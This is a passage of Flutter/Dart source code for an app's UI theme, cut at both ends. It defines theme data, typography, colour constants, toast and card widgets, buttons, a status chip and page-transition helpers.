          final selected = states.contains(WidgetState.selected);
          return IconThemeData(
            color: selected ? HoxtenThemeColors.cyan : HoxtenThemeColors.t2,
            size: 18,
          );
        }),
      ),
      snackBarTheme: SnackBarThemeData(
        behavior: SnackBarBehavior.floating,
        backgroundColor: const Color(0xFF050912),
        contentTextStyle: HoxtenThemeTypography.bodySmall(color: HoxtenThemeColors.t0),
      ),
    );
  }

  static ThemeData dark() {
    final base = ThemeData(
      useMaterial3: true,
      brightness: Brightness.dark,
      fontFamily: HoxtenTypography.fontFamily,
      scaffoldBackgroundColor: HoxtenColors.bg,
      colorScheme: const ColorScheme.dark(
        primary: HoxtenColors.accent,
        secondary: HoxtenColors.accent2,
        surface: HoxtenColors.card,
        error: HoxtenColors.error,
      ),
      splashFactory: InkSparkle.splashFactory,
    );

    final textTheme = HoxtenTypography.apply(base.textTheme).apply(
      bodyColor: HoxtenColors.text,
      displayColor: HoxtenColors.text,
    );

    return base.copyWith(
      textTheme: textTheme,
      pageTransitionsTheme: const PageTransitionsTheme(
        builders: {
          TargetPlatform.android: CupertinoPageTransitionsBuilder(),
          TargetPlatform.iOS: CupertinoPageTransitionsBuilder(),
        },
      ),
      appBarTheme: AppBarTheme(
        backgroundColor: Colors.transparent,
        elevation: 0,
        scrolledUnderElevation: 0,
        centerTitle: true,
        foregroundColor: HoxtenColors.text,
        titleTextStyle: textTheme.titleMedium?.copyWith(fontWeight: FontWeight.w700, letterSpacing: 0.5),
      ),
      inputDecorationTheme: InputDecorationTheme(
        filled: true,
        fillColor: HoxtenColors.accent.withValues(alpha: 0.05),
        hintStyle: TextStyle(fontFamily: HoxtenTypography.fontFamily, color: HoxtenColors.textMuted.withValues(alpha: 0.55), fontSize: 14),
        labelStyle: TextStyle(fontFamily: HoxtenTypography.fontFamily, color: HoxtenColors.textMuted.withValues(alpha: 0.8), fontSize: 13),
        contentPadding: const EdgeInsets.symmetric(horizontal: 18, vertical: 16),
        border: OutlineInputBorder(borderRadius: BorderRadius.circular(HoxtenRadius.sm), borderSide: BorderSide(color: HoxtenColors.accent.withValues(alpha: 0.12))),
        enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(HoxtenRadius.sm), borderSide: BorderSide(color: HoxtenColors.accent.withValues(alpha: 0.12))),
        focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(HoxtenRadius.sm), borderSide: const BorderSide(color: HoxtenColors.accent, width: 1.4)),
      ),
      snackBarTheme: SnackBarThemeData(
        behavior: SnackBarBehavior.floating,
        elevation: 8,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(HoxtenRadius.md)),
        backgroundColor: HoxtenColors.cardElevated,
      ),
      filledButtonTheme: FilledButtonThemeData(
        style: FilledButton.styleFrom(
          elevation: 0,
          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 14),
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(HoxtenRadius.sm)),
        ),
      ),
    );
  }

  static ThemeData light() => HoxtenDark();
}

abstract final class HoxtenTypography {
  static const fontFamily = HoxtenThemeTypography.fontFamily;

  static TextStyle _base({
    required double size,
    FontWeight weight = FontWeight.w400,
    double? letterSpacing,
    double? height,
    Color? color,
    List<Shadow>? shadows,
  }) {
    return HoxtenThemeTypography.style(
      fontSize: size,
      fontWeight: weight,
      letterSpacing: letterSpacing,
      height: height,
      color: color,
      shadows: shadows,
    );
  }

  static TextStyle brand({double size = 22, Color? color, Color? shadow}) {
    return _base(
      size: size,
      weight: FontWeight.w600,
      letterSpacing: 0.6,
      height: 1.1,
      color: color ?? HoxtenColors.dashAccent,
      shadows: shadow != null ? [Shadow(color: shadow.withValues(alpha: 0.35), blurRadius: 12)] : null,
    );
  }

  static TextStyle brandLogo({double size = 28, Color? color, Color? shadow}) {
    return HoxtenThemeTypography.logo(
      fontSize: size,
      letterSpacing: size >= 28 ? 3 : 2,
      color: color ?? HoxtenColors.dashAccent,
    ).copyWith(
      height: 1,
      shadows: shadow != null ? [Shadow(color: shadow.withValues(alpha: 0.35), blurRadius: 12)] : null,
    );
  }

  static TextStyle statValue({required bool active}) {
    return _base(
      size: 20,
      weight: FontWeight.w700,
      letterSpacing: 0.4,
      height: 1,
      color: active ? HoxtenColors.dashAccent : HoxtenColors.dashTextMuted,
    );
  }

  static TextStyle statLabel() {
    return _base(
      size: 10,
      weight: FontWeight.w600,
      letterSpacing: 0.8,
      color: HoxtenColors.dashText.withValues(alpha: 0.7),
    );
  }

  static TextStyle sectionTitle({bool light = true}) {
    return _base(
      size: 18,
      weight: FontWeight.w600,
      letterSpacing: 0.3,
      height: 1.2,
      color: light ? const Color(0xFF5C2440) : HoxtenColors.text,
    );
  }

  static TextStyle sectionSubtitle({bool light = true}) {
    return _base(
      size: 12,
      weight: FontWeight.w400,
      letterSpacing: 0.2,
      height: 1.4,
      color: light ? HoxtenColors.dashTextMuted : HoxtenColors.textMuted,
    );
  }

  static TextStyle menuTitle() {
    return _base(
      size: 15,
      weight: FontWeight.w600,
      letterSpacing: 0.2,
      height: 1.25,
      color: const Color(0xFF5C2440),
    );
  }

  static TextStyle menuSubtitle() {
    return _base(
      size: 13,
      weight: FontWeight.w400,
      letterSpacing: 0.1,
      height: 1.45,
      color: HoxtenColors.dashText.withValues(alpha: 0.82),
    );
  }

  static TextStyle welcomeName() {
    return _base(
      size: 18,
      weight: FontWeight.w600,
      letterSpacing: 0.3,
      height: 1.2,
      color: const Color(0xFF5C2440),
    );
  }

  static TextStyle welcomeMeta() {
    return _base(
      size: 11,
      weight: FontWeight.w500,
      letterSpacing: 0.2,
      height: 1.3,
      color: HoxtenColors.dashTextMuted,
    );
  }

  static TextStyle tagline({Color? color}) {
    return _base(
      size: 10,
      weight: FontWeight.w600,
      letterSpacing: 1.2,
      height: 1.2,
      color: color ?? HoxtenColors.dashText.withValues(alpha: 0.75),
    );
  }

  static TextStyle techId() {
    return _base(
      size: 10,
      weight: FontWeight.w500,
      letterSpacing: 0.2,
      height: 1.3,
      color: HoxtenColors.dashText,
    );
  }

  static TextStyle fieldLabel() {
    return _base(
      size: 13,
      weight: FontWeight.w500,
      color: HoxtenColors.dashText.withValues(alpha: 0.85),
    );
  }

  static TextTheme apply(TextTheme base) {
    return HoxtenThemeTypography.textTheme(base).apply(
      bodyColor: HoxtenColors.dashText,
      displayColor: const Color(0xFF5C2440),
    );
  }
}

abstract final class HoxtenThemeColors {
  static const accent = Color(0xFF8F949B);
  static const accent2 = Color(0xFF7EABFF);
  static const accent3 = Color(0xFFB8D3FF);
  static const text = Color(0xFFF8FAFC);
  static const textMuted = Color(0xFF4A6A9A);
  static const textDim = Color(0xFF1A2D4A);
  static const red = Color(0xFFE05C5C);
  static const green = Color(0xFF4FC878);

  static const b0 = Color(0xFF0A0A0A);
  static const b1 = Color(0xFF050D1F);
  static const b2 = Color(0xFF081428);
  static const b3 = Color(0xFF0D1E38);
  static const blue = Color(0xFF1D6FFF);
  static const blue2 = Color(0xFF4D8FFF);
  static const cyan = Color(0xFFC0C0C0);
  static const cyan2 = Color(0xFF00A8CC);
  static const dashGreen = Color(0xFF00E5A0);
  static const dashRed = Color(0xFFFF4D6D);
  static const dashAmber = Color(0xFFFFC34D);
  static const dashPurple = Color(0xFFA78BFA);
  static const t0 = Color(0xFFE8F4FF);
  static const t1 = Color(0xFF8AB4E0);
  static const t2 = Color(0xFF3D6080);
  static const cardPurple = Color(0xFFB08AFF);

  static const cardSurfaceTop = Color(0xFF0D1E38);
  static const cardSurfaceBot = Color(0xFF050D1F);
  static const cardBorder = Color(0xFF1A2F52);
  static const cardFooter = Color(0xFF06101E);

  static const navHeight = 70.0;
  static const radius = 16.0;
}

abstract final class HoxtenThemeTypography {
  static const fontFamily = 'Orbitron';

  static TextStyle style({
    double? fontSize,
    FontWeight? fontWeight,
    FontStyle? fontStyle,
    double? letterSpacing,
    double? height,
    Color? color,
    List<Shadow>? shadows,
    TextDecoration? decoration,
  }) {
    return TextStyle(
      fontFamily: fontFamily,
      fontSize: fontSize,
      fontWeight: fontWeight,
      fontStyle: fontStyle,
      letterSpacing: letterSpacing,
      height: height,
      color: color,
      shadows: shadows,
      decoration: decoration,
    );
  }

  static TextStyle logo({
    double fontSize = 18,
    Color? color,
    double letterSpacing = 4,
    FontWeight fontWeight = FontWeight.w700,
  }) {
    return style(
      fontSize: fontSize,
      fontWeight: fontWeight,
      letterSpacing: letterSpacing,
      height: 1.05,
      color: color ?? Colors.white,
    );
  }

  static TextStyle display({Color? color}) => style(
        fontSize: 28,
        fontWeight: FontWeight.w800,
        letterSpacing: 2,
        height: 1.1,
        color: color ?? HoxtenThemeColors.t0,
      );

  static TextStyle headline({Color? color}) => style(
        fontSize: 22,
        fontWeight: FontWeight.w700,
        letterSpacing: 1.5,
        height: 1.15,
        color: color ?? HoxtenThemeColors.t0,
      );

  static TextStyle title({Color? color}) => style(
        fontSize: 16,
        fontWeight: FontWeight.w600,
        letterSpacing: 1.2,
        height: 1.2,
        color: color ?? HoxtenThemeColors.t0,
      );

  static TextStyle body({Color? color}) => style(
        fontSize: 13,
        fontWeight: FontWeight.w500,
        letterSpacing: 0.6,
        height: 1.45,
        color: color ?? HoxtenThemeColors.t1,
      );

  static TextStyle bodySmall({Color? color}) => style(
        fontSize: 11,
        fontWeight: FontWeight.w500,
        letterSpacing: 0.5,
        height: 1.4,
        color: color ?? HoxtenThemeColors.t2,
      );

  static TextStyle tag({Color? color, double fontSize = 10}) => style(
        fontSize: fontSize,
        fontWeight: FontWeight.w600,
        letterSpacing: 2.2,
        height: 1.2,
        color: color ?? HoxtenThemeColors.t2,
      );

  static TextStyle caption({Color? color}) => style(
        fontSize: 10,
        fontWeight: FontWeight.w500,
        letterSpacing: 1.8,
        height: 1.3,
        color: color ?? HoxtenThemeColors.t2,
      );

  static TextStyle button({Color? color}) => style(
        fontSize: 12,
        fontWeight: FontWeight.w700,
        letterSpacing: 2,
        height: 1.1,
        color: color ?? Colors.white,
      );

  static TextStyle navLabel({required bool active, Color? color}) => style(
        fontSize: 10,
        fontWeight: active ? FontWeight.w700 : FontWeight.w500,
        letterSpacing: active ? 1.2 : 0.8,
        height: 1.1,
        color: color ?? (active ? HoxtenThemeColors.cyan : HoxtenThemeColors.t2),
      );

  static TextStyle field({Color? color}) => style(
        fontSize: 13,
        fontWeight: FontWeight.w500,
        letterSpacing: 0.8,
        height: 1.35,
        color: color ?? HoxtenThemeColors.t0,
      );

  static TextStyle fieldHint({Color? color}) => style(
        fontSize: 12,
        fontWeight: FontWeight.w400,
        letterSpacing: 1,
        color: color ?? HoxtenThemeColors.t2,
      );

  static TextStyle price({Color? color}) => style(
        fontSize: 18,
        fontWeight: FontWeight.w700,
        letterSpacing: 1.5,
        color: color ?? HoxtenThemeColors.cyan,
      );

  static TextTheme textTheme([TextTheme? base]) {
    final source = base ?? Typography.material2021(platform: TargetPlatform.android).white;
    return TextTheme(
      displayLarge: display(),
      displayMedium: display().copyWith(fontSize: 24),
      displaySmall: headline(),
      headlineLarge: headline(),
      headlineMedium: title().copyWith(fontSize: 18),
      headlineSmall: title(),
      titleLarge: title(),
      titleMedium: body().copyWith(fontWeight: FontWeight.w600, color: HoxtenThemeColors.t0),
      titleSmall: bodySmall().copyWith(fontWeight: FontWeight.w600, color: HoxtenThemeColors.t0),
      bodyLarge: body(),
      bodyMedium: bodySmall(),
      bodySmall: caption(),
      labelLarge: button(),
      labelMedium: tag(fontSize: 9),
      labelSmall: caption().copyWith(fontSize: 9, letterSpacing: 1.5),
    ).apply(
      bodyColor: HoxtenThemeColors.t1,
      displayColor: HoxtenThemeColors.t0,
      fontFamily: fontFamily,
    );
  }
}

void showHoxtenToast(
  BuildContext context, {
  required String title,
  required String message,
  bool success = false,
}) {
  final overlay = Overlay.of(context);
  late OverlayEntry entry;
  entry = OverlayEntry(
    builder: (ctx) => _HoxtenToast(
      title: title,
      message: message,
      success: success,
      onDismiss: () => entry.remove(),
    ),
  );
  overlay.insert(entry);
}

class _HoxtenToast extends StatefulWidget {
  const _HoxtenToast({
    required this.title,
    required this.message,
    required this.success,
    required this.onDismiss,
  });

  final String title;
  final String message;
  final bool success;
  final VoidCallback onDismiss;

  @override
  State<_HoxtenToast> createState() => _HoxtenToastState();
}

class _HoxtenToastState extends State<_HoxtenToast> with SingleTickerProviderStateMixin {
  late final AnimationController _ctrl;
  Timer? _timer;

  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 350))..forward();
    _timer = Timer(const Duration(seconds: 3), () async {
      await _ctrl.reverse();
      widget.onDismiss();
    });
  }

  @override
  void dispose() {
    _timer?.cancel();
    _ctrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final accent = widget.success ? HoxtenThemeColors.green : HoxtenThemeColors.red;
    return Positioned(
      top: 24,
      left: 20,
      right: 20,
      child: SafeArea(
        child: FadeTransition(
          opacity: _ctrl,
          child: SlideTransition(
            position: Tween<Offset>(begin: const Offset(0, -0.08), end: Offset.zero).animate(
              CurvedAnimation(parent: _ctrl, curve: Curves.easeOutCubic),
            ),
            child: Material(
              color: Colors.transparent,
              child: Container(
                padding: const EdgeInsets.fromLTRB(16, 13, 16, 13),
                decoration: BoxDecoration(
                  color: const Color(0xF2050912),
                  borderRadius: BorderRadius.circular(14),
                  border: Border(
                    left: BorderSide(color: accent, width: 3),
                    top: BorderSide(color: accent.withValues(alpha: 0.2)),
                    right: BorderSide(color: accent.withValues(alpha: 0.2)),
                    bottom: BorderSide(color: accent.withValues(alpha: 0.2)),
                  ),
                  boxShadow: [
                    BoxShadow(color: Colors.black.withValues(alpha: 0.65), blurRadius: 48, offset: const Offset(0, 16)),
                    BoxShadow(color: accent.withValues(alpha: 0.06), blurRadius: 32),
                  ],
                ),
                child: Row(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Container(
                      width: 28,
                      height: 28,
                      decoration: BoxDecoration(
                        color: accent.withValues(alpha: 0.1),
                        borderRadius: BorderRadius.circular(8),
                        border: Border.all(color: accent.withValues(alpha: 0.18)),
                      ),
                      child: Icon(
                        widget.success ? Icons.check_circle_outline : Icons.error_outline,
                        size: 13,
                        color: accent,
                      ),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            widget.title,
                            style: HoxtenThemeTypography.tag(
                              fontSize: 11,
                              color: widget.success ? const Color(0xFF6EE09A) : const Color(0xFFF08080),
                            ),
                          ),
                          const SizedBox(height: 3),
                          Text(
                            widget.message,
                            style: HoxtenThemeTypography.bodySmall(
                              color: widget.success ? const Color(0xB396DCAA) : const Color(0xB3DCAAAA),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }
}

class HoxtenCard extends StatelessWidget {
  const HoxtenCard({
    super.key,
    required this.child,
    this.padding = const EdgeInsets.all(18),
    this.accent = false,
    this.selected = false,
    this.onTap,
  });

  final Widget child;
  final EdgeInsets padding;
  final bool accent;
  final bool selected;
  final VoidCallback? onTap;

  @override
  Widget build(BuildContext context) {
    final card = Container(
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(16),
        color: HoxtenThemeColors.b2,
        border: Border.all(
          color: selected ? HoxtenThemeColors.cyan.withValues(alpha: 0.45) : HoxtenThemeColors.blue.withValues(alpha: 0.14),
          width: selected ? 1.2 : 1,
        ),
        boxShadow: [
          BoxShadow(
            color: HoxtenThemeColors.blue.withValues(alpha: 0.06),
            blurRadius: 20,
            offset: const Offset(0, 8),
          ),
        ],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(16),
        child: Stack(
          children: [
            if (accent)
              Positioned(
                left: 0,
                top: 14,
                bottom: 14,
                child: Container(
                  width: 3,
                  decoration: BoxDecoration(
                    gradient: const LinearGradient(
                      begin: Alignment.topCenter,
                      end: Alignment.bottomCenter,
                      colors: [HoxtenThemeColors.cyan, HoxtenThemeColors.blue],
                    ),
                    borderRadius: BorderRadius.circular(99),
                  ),
                ),
              ),
            Padding(
              padding: padding.copyWith(left: accent ? padding.left + 6 : padding.left),
              child: child,
            ),
          ],
        ),
      ),
    );

    if (onTap == null) return card;
    return Material(
      color: Colors.transparent,
      child: InkWell(
        borderRadius: BorderRadius.circular(16),
        onTap: onTap,
        splashColor: HoxtenThemeColors.cyan.withValues(alpha: 0.08),
        highlightColor: HoxtenThemeColors.blue.withValues(alpha: 0.06),
        child: card,
      ),
    );
  }
}

class HoxtenSheetChrome extends StatelessWidget {
  const HoxtenSheetChrome({
    super.key,
    required this.child,
    this.topRadius = true,
    this.padding,
  });

  final Widget child;
  final bool topRadius;
  final EdgeInsets? padding;

  static Widget handle() => Container(
        width: 40,
        height: 4,
        decoration: BoxDecoration(
          color: HoxtenThemeColors.cyan.withValues(alpha: 0.35),
          borderRadius: BorderRadius.circular(99),
        ),
      );

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: padding,
      decoration: BoxDecoration(
        color: HoxtenThemeColors.b2,
        borderRadius: topRadius
            ? const BorderRadius.vertical(top: Radius.circular(22))
            : BorderRadius.circular(20),
        border: Border.all(color: HoxtenThemeColors.blue.withValues(alpha: 0.18)),
      ),
      child: child,
    );
  }
}

class HoxtenSectionLabel extends StatelessWidget {
  const HoxtenSectionLabel(this.text, {super.key});

  final String text;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 18, 16, 10),
      child: Row(
        children: [
          Text(
            text.toUpperCase(),
            style: HoxtenThemeTypography.style(
              fontSize: 11,
              fontWeight: FontWeight.w600,
              letterSpacing: 3,
              color: HoxtenThemeColors.t1,
            ),
          ),
          const SizedBox(width: 10),
          Expanded(
            child: Container(
              height: 1,
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [
                    HoxtenThemeColors.blue.withValues(alpha: 0.22),
                    Colors.transparent,
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

class FadeSlideIn extends StatefulWidget {
  const FadeSlideIn({super.key, required this.child, this.delay = Duration.zero, this.offsetY = 18});

  final Widget child;
  final Duration delay;
  final double offsetY;

  @override
  State<FadeSlideIn> createState() => _FadeSlideInState();
}

class _FadeSlideInState extends State<FadeSlideIn> with SingleTickerProviderStateMixin {
  late final AnimationController _ctrl;
  late final Animation<double> _fade;
  late final Animation<Offset> _slide;

  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(vsync: this, duration: HoxtenMotion.normal);
    _fade = CurvedAnimation(parent: _ctrl, curve: HoxtenMotion.curve);
    _slide = Tween<Offset>(begin: Offset(0, widget.offsetY / 100), end: Offset.zero).animate(_fade);
    Future<void>.delayed(widget.delay, () {
      if (mounted) _ctrl.forward();
    });
  }

  @override
  void dispose() {
    _ctrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return FadeTransition(
      opacity: _fade,
      child: SlideTransition(position: _slide, child: widget.child),
    );
  }
}

class SyncCard extends StatelessWidget {
  const SyncCard({super.key, required this.child, this.padding = const EdgeInsets.all(20)});

  final Widget child;
  final EdgeInsets padding;

  @override
  Widget build(BuildContext context) {
    return GlassPanel(padding: padding, child: child);
  }
}

class DashCard extends StatelessWidget {
  const DashCard({super.key, required this.child, this.padding = const EdgeInsets.all(18), this.onTap});

  final Widget child;
  final EdgeInsets padding;
  final VoidCallback? onTap;

  @override
  Widget build(BuildContext context) {
    final card = Container(
      padding: padding,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(HoxtenRadius.md),
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [HoxtenThemeColors.b3.withValues(alpha: 0.9), HoxtenThemeColors.b2],
        ),
        border: Border.all(color: HoxtenThemeColors.blue.withValues(alpha: 0.14)),
        boxShadow: [
          BoxShadow(color: HoxtenColors.dashAccent.withValues(alpha: 0.08), blurRadius: 20, offset: const Offset(0, 8)),
          BoxShadow(color: Colors.black.withValues(alpha: 0.03), blurRadius: 8, offset: const Offset(0, 2)),
        ],
      ),
      child: child,
    );

    if (onTap == null) return card;
    return Material(
      color: Colors.transparent,
      child: InkWell(
        borderRadius: BorderRadius.circular(HoxtenRadius.md),
        onTap: onTap,
        splashColor: HoxtenColors.dashAccent.withValues(alpha: 0.08),
        highlightColor: HoxtenColors.dashAccent.withValues(alpha: 0.04),
        child: card,
      ),
    );
  }
}

class ElegantCard extends StatelessWidget {
  const ElegantCard({super.key, required this.child, this.padding = const EdgeInsets.all(18), this.accent = false, this.onTap});

  final Widget child;
  final EdgeInsets padding;
  final bool accent;
  final VoidCallback? onTap;

  static const surface = HoxtenThemeColors.b2;

  @override
  Widget build(BuildContext context) {
    final card = Container(
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(20),
        color: surface,
        border: Border.all(color: HoxtenColors.dashAccent.withValues(alpha: 0.11)),
        boxShadow: [
          BoxShadow(
            color: HoxtenColors.dashAccent.withValues(alpha: 0.05),
            blurRadius: 14,
            offset: const Offset(0, 5),
          ),
        ],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(20),
        child: Stack(
          children: [
            if (accent)
              Positioned(
                left: 0,
                top: 14,
                bottom: 14,
                child: Container(
                  width: 3,
                  decoration: BoxDecoration(
                    color: HoxtenColors.dashAccent.withValues(alpha: 0.75),
                    borderRadius: BorderRadius.circular(99),
                  ),
                ),
              ),
            Padding(
              padding: padding.copyWith(left: accent ? padding.left + 6 : padding.left),
              child: child,
            ),
          ],
        ),
      ),
    );

    if (onTap == null) return card;
    return Material(
      color: Colors.transparent,
      child: InkWell(
        onTap: onTap,
        borderRadius: BorderRadius.circular(20),
        splashColor: HoxtenColors.dashAccent.withValues(alpha: 0.06),
        child: card,
      ),
    );
  }
}

class SectionLabel extends StatelessWidget {
  const SectionLabel({super.key, required this.icon, required this.title, required this.subtitle});

  final IconData icon;
  final String title;
  final String subtitle;

  @override
  Widget build(BuildContext context) {
    return Row(
      children: [
        Container(
          width: 40,
          height: 40,
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(12),
            color: HoxtenColors.dashAccent.withValues(alpha: 0.07),
            border: Border.all(color: HoxtenColors.dashAccent.withValues(alpha: 0.14)),
          ),
          child: Icon(icon, color: HoxtenColors.dashAccent, size: 20),
        ),
        const SizedBox(width: 12),
        Expanded(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(title, style: HoxtenTypography.menuTitle()),
              Text(subtitle, style: HoxtenTypography.menuSubtitle()),
            ],
          ),
        ),
      ],
    );
  }
}

class SyncPrimaryButton extends StatefulWidget {
  const SyncPrimaryButton({
    super.key,
    required this.label,
    required this.onPressed,
    this.loading = false,
    this.icon,
    this.variant = ButtonVariant.dark,
  });

  final String label;
  final VoidCallback? onPressed;
  final bool loading;
  final IconData? icon;
  final ButtonVariant variant;

  @override
  State<SyncPrimaryButton> createState() => _SyncPrimaryButtonState();
}

enum ButtonVariant { dark, light, outline }

class _SyncPrimaryButtonState extends State<SyncPrimaryButton> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    final isDark = widget.variant == ButtonVariant.dark;
    final isOutline = widget.variant == ButtonVariant.outline;

    final gradient = isOutline
        ? null
        : LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: isDark
                ? [HoxtenColors.accent.withValues(alpha: 0.28), HoxtenColors.accent.withValues(alpha: 0.12)]
                : [HoxtenColors.dashAccent, HoxtenColors.dashAccent2],
          );

    final fg = isOutline
        ? (isDark ? HoxtenColors.accent2 : HoxtenColors.dashAccent)
        : (isDark ? HoxtenColors.accent2 : Colors.white);

    return AnimatedScale(
      scale: _pressed ? 0.98 : 1,
      duration: HoxtenMotion.fast,
      curve: HoxtenMotion.curve,
      child: Material(
        color: Colors.transparent,
        child: InkWell(
          onTap: widget.loading ? null : widget.onPressed,
          onHighlightChanged: (v) => setState(() => _pressed = v),
          borderRadius: BorderRadius.circular(14),
          child: Ink(
            height: 52,
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(14),
              gradient: gradient,
              color: isOutline ? Colors.transparent : null,
              border: Border.all(
                color: isOutline
                    ? (isDark ? HoxtenColors.accent.withValues(alpha: 0.35) : HoxtenColors.dashAccent.withValues(alpha: 0.35))
                    : (isDark ? HoxtenColors.accent.withValues(alpha: 0.35) : Colors.transparent),
              ),
              boxShadow: isOutline
                  ? null
                  : [
                      BoxShadow(
                        color: (isDark ? HoxtenColors.accent : HoxtenColors.dashAccent).withValues(alpha: 0.22),
                        blurRadius: 18,
                        offset: const Offset(0, 8),
                      ),
                    ],
            ),
            child: Center(
              child: widget.loading
                  ? SizedBox(
                      width: 20,
                      height: 20,
                      child: CircularProgressIndicator(strokeWidth: 2.2, color: fg),
                    )
                  : Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        if (widget.icon != null) ...[Icon(widget.icon, size: 18, color: fg), const SizedBox(width: 8)],
                        Text(
                          widget.label,
                          style: HoxtenTypography.menuTitle().copyWith(fontSize: 13, letterSpacing: 0.6, color: fg),
                        ),
                      ],
                    ),
            ),
          ),
        ),
      ),
    );
  }
}

class SectionTitle extends StatelessWidget {
  const SectionTitle(this.title, {super.key, this.subtitle, this.light = false});

  final String title;
  final String? subtitle;
  final bool light;

  @override
  Widget build(BuildContext context) {
    final accent = light ? HoxtenColors.dashAccent : HoxtenColors.accent;

    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(
          title,
          style: light ? HoxtenTypography.sectionTitle() : HoxtenTypography.sectionTitle(light: false),
        ),
        if (subtitle != null) ...[
          const SizedBox(height: 4),
          Text(
            subtitle!,
            style: light ? HoxtenTypography.sectionSubtitle() : HoxtenTypography.sectionSubtitle(light: false),
          ),
        ],
        const SizedBox(height: 10),
        Container(
          width: 36,
          height: 3,
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(99),
            gradient: LinearGradient(colors: [accent, accent.withValues(alpha: 0)]),
          ),
        ),
      ],
    );
  }
}

Route<T> syncPageRoute<T>(Widget page) {
  return PageRouteBuilder<T>(
    pageBuilder: (_, __, ___) => page,
    transitionDuration: HoxtenMotion.normal,
    reverseTransitionDuration: HoxtenMotion.fast,
    transitionsBuilder: (_, animation, __, child) {
      final curved = CurvedAnimation(parent: animation, curve: HoxtenMotion.curve);
      return FadeTransition(
        opacity: curved,
        child: SlideTransition(
          position: Tween<Offset>(begin: const Offset(0, 0.04), end: Offset.zero).animate(curved),
          child: child,
        ),
      );
    },
  );
}

class SyncStatusChip extends StatelessWidget {
  const SyncStatusChip({super.key, required this.label, this.active = true, this.light = true});

  final String label;
  final bool active;
  final bool light;

  @override
  Widget build(BuildContext context) {
    final color = active ? HoxtenColors.success : HoxtenColors.textMuted;
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(99),
        color: color.withValues(alpha: light ? 0.1 : 0.14),
        border: Border.all(color: color.withValues(alpha: 0.28)),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            width: 6,
            height: 6,
            decoration: BoxDecoration(shape: BoxShape.circle, color: color, boxShadow: active ? [BoxShadow(color: color.withValues(alpha: 0.6), blurRadius: 6)] : null),
          ),
          const SizedBox(width: 6),
          Text(label, style: TextStyle(fontSize: 10, fontWeight: FontWeight.w700, color: light ? (active ? const Color(0xFF2E7D4A) : HoxtenColors.dashTextMuted) : color)),
        ],
      ),
    );
  }
}

class SyncHeroBanner extends StatelessWidget {
  const SyncHeroBanner({super.key, required this.title, required this.subtitle, this.light = true});

  final String title;
  final String subtitle;
  final bool light;

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.all(22),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(HoxtenRadius.lg),
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: light
              ? [HoxtenColors.dashAccent.withValues(alpha: 0.18), Colors.white.withValues(alpha: 0.95), HoxtenColors.dashAccent2.withValues(alpha: 0.1)]
              : [HoxtenColors.accent.withValues(alpha: 0.2), HoxtenColors.card, HoxtenColors.accent2.withValues(alpha: 0.08)],
        ),
        border: Border.all(color: (light ? HoxtenColors.dashAccent : HoxtenColors.accent).withValues(alpha: 0.2)),
        boxShadow: [
          BoxShadow(
            color: (light ? HoxtenColors.dashAccent : HoxtenColors.accent).withValues(alpha: 0.1),
            blurRadius: 24,
            offset: const Offset(0, 10),
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            title,
            style: TextStyle(
              fontSize: 24,
              fontWeight: FontWeight.w900,
              letterSpacing: -0.5,
              color: light ? const Color(0xFF6B2848) : HoxtenColors.text,
            ),
          ),
          const SizedBox(height: 6),
          Text(
            subtitle,
            style: TextStyle(
              fontSize: 13,
              height: 1.4,
              color: light ? HoxtenColors.dashText.withValues(alpha: 0.85) : HoxtenColors.textMuted,
            ),
          ),
        ],
      ),
    );
  }
}

bool _scaffoldHasBottomChrome(BuildContext context) {
  final scaffold = Scaffold.maybeOf(context);
  if (scaffold == null) return false;
  return scaffold.widget.bottomNavigationBar != null ||
      scaffold.widget.persistentFooterButtons != null ||
      scaffold.widget.floatingActionButton != null;
}

void showSyncSnack(BuildContext context, String message, {bool error = false, bool success = false}) {
  final icon = error
      ? Icons.error_outline_rounded
      : success
          ? Icons.check_circle_outline_rounded
          : Icons.info_outline_rounded;
  final color = error
      ? HoxtenThemeColors.dashRed
      : success
          ? HoxtenThemeColors.dashGreen
          : HoxtenThemeColors.cyan;
